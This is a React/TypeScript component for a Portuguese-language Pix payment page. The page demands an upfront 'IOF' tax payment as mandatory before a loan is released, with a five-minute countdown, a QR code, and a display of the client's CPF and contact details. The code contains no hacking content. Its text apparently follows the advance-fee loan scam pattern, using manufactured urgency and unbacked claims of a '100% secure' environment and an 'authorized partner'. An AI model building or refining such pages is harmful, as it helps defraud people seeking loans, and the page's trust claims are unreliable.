import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import {
  Copy,
  CheckCircle,
  Clock,
  AlertCircle,
  XCircle,
  ShieldCheck,
  Lock,
} from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { cn } from "@/lib/utils";
import { formatCurrency } from "@/utils/formatters";

const statusConfig = {
  pending: {
    label: "Aguardando Pagamento",
    icon: Clock,
    color: "text-amber-500 bg-amber-50 border-amber-200",
  },
  paid: {
    label: "Pagamento Confirmado",
    icon: CheckCircle,
    color: "text-green-600 bg-green-50 border-green-200",
  },
  expired: {
    label: "Pagamento Expirado",
    icon: AlertCircle,
    color: "text-red-500 bg-red-50 border-red-200",
  },
  cancelled: {
    label: "Pagamento Cancelado",
    icon: XCircle,
    color: "text-gray-500 bg-gray-50 border-gray-200",
  },
};

const EXPIRATION_MINUTES = 5;

const PixPaymentDetails = () => {
  const location = useLocation();
  const { pix, transactionId, iofValue, client } = location.state || {};

  // Status polling
  const [status, setStatus] = useState("pending");
  const [statusDesc, setStatusDesc] = useState("");
  const [timer, setTimer] = useState(EXPIRATION_MINUTES * 60); // segundos
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    let timeout: NodeJS.Timeout;
    if (transactionId) {
      const fetchStatus = async () => {
        try {
          const res = await fetch(`/api/pix-status?id=${transactionId}`);
          const data = await res.json();
          if (data.status) {
            if (data.status === "PAID") setStatus("paid");
            else if (data.status === "EXPIRED") setStatus("expired");
            else if (data.status === "CANCELLED") setStatus("cancelled");
            else setStatus("pending");
          }
          if (data.statusDescription) setStatusDesc(data.statusDescription);
        } catch (e) {}
      };
      fetchStatus();
      interval = setInterval(fetchStatus, 5000);
    }
    // Timer regressivo
    timeout = setInterval(() => {
      setTimer((t) => (t > 0 ? t - 1 : 0));
    }, 1000);
    return () => {
      if (interval) clearInterval(interval);
      if (timeout) clearInterval(timeout);
    };
  }, [transactionId]);

  // Formatar timer
  const formatTimer = (t: number) => {
    const min = Math.floor(t / 60)
      .toString()
      .padStart(2, "0");
    const sec = (t % 60).toString().padStart(2, "0");
    return `${min}:${sec}`;
  };

  const handleCopyPixCode = async () => {
    try {
      await navigator.clipboard.writeText(pix?.code || "");
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Failed to copy text: ", err);
    }
  };

  const StatusIcon = statusConfig[status].icon;

  return (
    <div className="max-w-md mx-auto px-4 py-8">
      <Card className="bg-background overflow-hidden shadow-2xl rounded-2xl">
        <div className="bg-green-600 py-4 px-6">
          <h1 className="text-white text-2xl font-bold text-center">
            Pagamento do IOF
          </h1>
        </div>
        <CardContent className="p-6 flex flex-col items-center">
          {/* Valor do IOF em destaque */}
          <div className="flex flex-col items-center mb-2">
            <span className="text-base text-green-800 font-semibold">
              Valor do IOF
            </span>
            <span className="text-3xl font-bold text-green-700">
              {Number(iofValue).toLocaleString("pt-BR", {
                style: "currency",
                currency: "BRL",
              })}
            </span>
          </div>
          <p className="text-sm text-gray-700 text-center mb-4">
            Este é o valor do IOF referente à sua operação de crédito.
            <br />O pagamento é obrigatório para liberação do seu empréstimo.
          </p>

          {/* Timer e status */}
          <div className="flex flex-col items-center mb-4">
            {status === "pending" && (
              <>
                <span className="text-xs text-gray-600 mb-1">
                  Tempo restante para pagamento
                </span>
                <span className="bg-green-50 border border-green-200 rounded-lg py-1 px-3 text-lg font-bold text-green-700">
                  {formatTimer(timer)}
                </span>
              </>
            )}
            {status === "paid" && (
              <span className="text-green-700 font-semibold flex items-center gap-1">
                <CheckCircle className="w-4 h-4" /> Pagamento confirmado!
              </span>
            )}
            {status === "expired" && (
              <span className="text-red-600 font-semibold">
                Pagamento expirado
              </span>
            )}
          </div>

          {/* QR Code */}
          <div className="bg-white p-4 rounded-xl border-2 border-green-200 shadow-sm mb-4">
            {pix?.base64 ? (
              <img
                src={`data:image/png;base64,${pix.base64}`}
                alt="QR Code Pix"
                className="w-48 h-48 object-contain"
              />
            ) : pix?.image ? (
              <img
                src={pix.image}
                alt="QR Code Pix"
                className="w-48 h-48 object-contain"
              />
            ) : null}
          </div>
          <p className="text-sm text-gray-500 text-center mb-2">
            Escaneie o QR Code com o aplicativo do seu banco
          </p>

          {/* Código Pix e botão copiar */}
          <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-2 w-full">
            <div className="flex justify-between items-center mb-2">
              <h3 className="font-medium text-green-800">Código Pix</h3>
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="sm"
                      className="h-8 border-green-300 hover:bg-green-100 hover:text-green-700"
                      onClick={handleCopyPixCode}
                    >
                      {copied ? (
                        <CheckCircle className="mr-1 h-4 w-4 text-green-600" />
                      ) : (
                        <Copy className="mr-1 h-4 w-4" />
                      )}
                      {copied ? "Copiado!" : "Copiar"}
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>Copiar código Pix</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>
            </div>
            <div className="bg-white p-3 rounded border border-green-200 break-all text-sm font-mono">
              {pix?.code}
            </div>
          </div>
          <p className="text-sm text-gray-500 mb-4">
            Ou copie o código acima e cole no aplicativo do seu banco
          </p>

          {/* Seção de Segurança */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4 w-full flex flex-col items-center mb-4">
            <div className="flex items-center gap-2 mb-2">
              <Lock className="w-5 h-5 text-green-700" />
              <span className="text-green-800 font-semibold">
                Ambiente 100% Seguro
              </span>
            </div>
            <p className="text-xs text-green-700 text-center mb-1">
              Todas as informações são protegidas por criptografia e você está
              em um ambiente autorizado.
            </p>
            <p className="text-xs text-green-700 text-center mb-1">
              Nunca compartilhe seu código Pix com terceiros.
            </p>
            <div className="flex items-center gap-1 mt-2">
              <ShieldCheck className="w-4 h-4 text-green-600" />
              <span className="text-xs text-green-700 font-medium">
                Parceiro autorizado Axipayments
              </span>
            </div>
          </div>

          {/* Dados do cliente */}
          <div className="w-full mb-4">
            <h3 className="text-green-800 font-semibold mb-2 text-base">
              Seus dados
            </h3>
            <div className="text-sm text-gray-700">
              <div>
                <span className="font-medium">Nome:</span> {client?.name}
              </div>
              <div>
                <span className="font-medium">CPF:</span> {client?.cpf}
              </div>
              <div>
                <span className="font-medium">E-mail:</span> {client?.email}
              </div>
              <div>
                <span className="font-medium">Telefone:</span> {client?.phone}
              </div>
            </div>
          </div>

          <p className="text-xs text-gray-500 text-center mt-2">
            Após o pagamento do IOF, seu empréstimo será liberado
            automaticamente.
          </p>
        </CardContent>
      </Card>
    </div>
  );
};

export default PixPaymentDetails;
